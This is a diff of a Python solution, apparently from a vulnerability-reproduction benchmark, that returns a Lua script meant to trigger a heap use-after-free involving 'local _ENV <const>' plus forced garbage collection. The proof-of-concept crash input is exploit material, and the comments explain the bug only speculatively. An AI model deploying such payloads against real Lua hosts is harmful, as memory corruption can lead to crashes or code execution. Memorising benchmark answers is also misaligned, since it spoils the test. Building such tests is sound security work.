@@ -1,38 +1,42 @@
-import os
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
-        related to _ENV <const>.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua 5.4.x
+        related to 'local _ENV <const>'.
         """
-        # The vulnerability is triggered when _ENV is declared as a const local variable.
-        # The Lua compiler (in affected versions like 5.4.0-5.4.3) generates incorrect code
-        # for upvalue handling of such variables. This can lead to the _ENV table being
-        # garbage collected while a closure still holds a reference to it (or an invalid
-        # stack reference), resulting in a Use-After-Free when the closure accesses globals.
+        # The vulnerability exists because declaring _ENV as a const local variable causes
+        # the Lua compiler/parser to mishandle the upvalue management for it. Specifically,
+        # it may fail to properly close the upvalue or mark it as escaping, leaving a
+        # dangling reference to the stack slot.
+        #
+        # When the function returns, the stack frame is invalidated. If we allocate a heap
+        # object (table) to _ENV, and the upvalue management is broken, the GC may collect
+        # the table because it doesn't see the upvalue reference, or the upvalue points
+        # to a dead stack slot. Accessing it triggers a Use-After-Free.
         
-        poc_script = (
-            b"local function factory()\n"
-            b"  -- Declare _ENV as a local const table. This is the trigger condition.\n"
-            b"  local _ENV <const> = { panic = 'now' }\n"
-            b"  \n"
-            b"  -- Return a closure that uses a global variable.\n"
-            b"  -- This implicitly accesses the local _ENV upvalue.\n"
-            b"  return function()\n"
-            b"    return panic\n"
+        poc = (
+            b"local function exploit()\n"
+            b"  local function factory()\n"
+            b"    -- Declare _ENV as a const local table. The <const> triggers the compiler bug.\n"
+            b"    local _ENV <const> = { x = 1 }\n"
+            b"    -- Return a closure that accesses _ENV. This creates an upvalue.\n"
+            b"    return function()\n"
+            b"      return _ENV.x\n"
+            b"    end\n"
             b"  end\n"
+            b"\n"
+            b"  local c = factory()\n"
+            b"  -- Force garbage collection. If the upvalue tracking is broken, the table\n"
+            b"  -- assigned to _ENV may be collected.\n"
+            b"  collectgarbage()\n"
+            b"  collectgarbage()\n"
+            b"\n"
+            b"  -- Access the closure. This accesses the dangling upvalue/freed memory.\n"
+            b"  c()\n"
             b"end\n"
             b"\n"
-            b"-- Create the closure\n"
-            b"local closure = factory()\n"
-            b"\n"
-            b"-- Force garbage collection. If the upvalue was not correctly secured,\n"
-            b"-- the _ENV table will be freed here.\n"
-            b"collectgarbage()\n"
-            b"\n"
-            b"-- Execute the closure. It attempts to access the freed _ENV table.\n"
-            b"closure()\n"
+            b"exploit()\n"
         )
-        
-        return poc_script
+        return poc
